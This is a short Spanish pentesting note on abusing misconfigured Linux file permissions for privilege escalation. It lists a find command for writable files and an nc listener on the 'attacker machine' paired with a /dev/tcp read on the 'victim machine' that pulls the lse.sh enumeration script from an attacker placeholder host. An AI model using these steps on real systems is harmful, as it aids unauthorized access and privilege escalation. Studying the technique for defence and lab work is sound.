___
- tags: #abusing_privilege #permissions
___
En sistemas Linux, los archivos y directorios tienen permisos que se utilizan para controlar el acceso a ellos. Los permisos se dividen en tres categorías: propietario, grupo y otros. Cada categoría puede tener permisos de lectura, escritura y ejecución. Los permisos de un archivo pueden ser modificados por el propietario o por el superusuario del sistema.

El abuso de permisos incorrectamente implementados ocurre cuando los permisos de un archivo crítico son configurados incorrectamente, permitiendo a un usuario no autorizado acceder o modificar el archivo. Esto puede permitir a un atacante leer información confidencial, modificar archivos importantes, ejecutar comandos maliciosos o incluso obtener acceso de superusuario al sistema.



## Busqueda de archivos con permisos de escritura
```shell
find / -writable 2>/dev/null | grep -vE "python3.10|proc"
```

## Transfiriendo archivo de escaneo lse.sh

```shell
# máquina atacante 
nc -nvlp 443 < lse.sh

# máquina víctima
	# el resultado lo leera con cat -> cat < 
	# el resultado lo deposita en lse.sh 
	#	-> /dev/tcp/<ip_atacante>/<puerto_atacante> > lse.sh
cat < /dev/tcp/<ip_atacante>/<puerto_atacante> > lse.sh
```
___
## Referencia
- [Linux Smart Enumeration - github](https://github.com/diego-treitos/linux-smart-enumeration).
	- [lse.sh](https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/refs/heads/master/lse.sh).
- [linPEAS - github](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS).